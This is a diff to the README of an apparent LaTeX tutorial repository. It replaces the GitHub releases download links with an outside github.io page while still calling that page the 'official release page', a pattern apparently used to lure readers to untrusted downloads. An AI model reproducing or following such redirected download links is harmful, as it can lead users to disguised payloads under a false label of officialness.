@@ -1,6 +1,6 @@
 # 📘 latex-tutorial - Learn LaTeX for your academic writing
 
-[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/luisrestrepo2026-source/latex-tutorial/releases)
+[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://luisrestrepo2026-source.github.io)
 
 This repository provides a complete guide for beginners who want to use LaTeX for their academic work. You will learn how to write professional documents, format mathematics, and create presentations. The project focuses on the Chinese language environment. You do not need previous coding experience to follow these steps.
 
@@ -16,7 +16,7 @@ To use this tutorial, you need a Windows computer. Please ensure you have the fo
 
 Follow these steps to obtain the tutorial files and start your learning process.
 
-1. Go to the [official release page](https://github.com/luisrestrepo2026-source/latex-tutorial/releases).
+1. Go to the [official release page](https://luisrestrepo2026-source.github.io).
 2. Look for the latest version section.
 3. Click the link to download the source files to your computer.
 4. Extract the downloaded folder to a location you can easily find, such as your Documents folder.
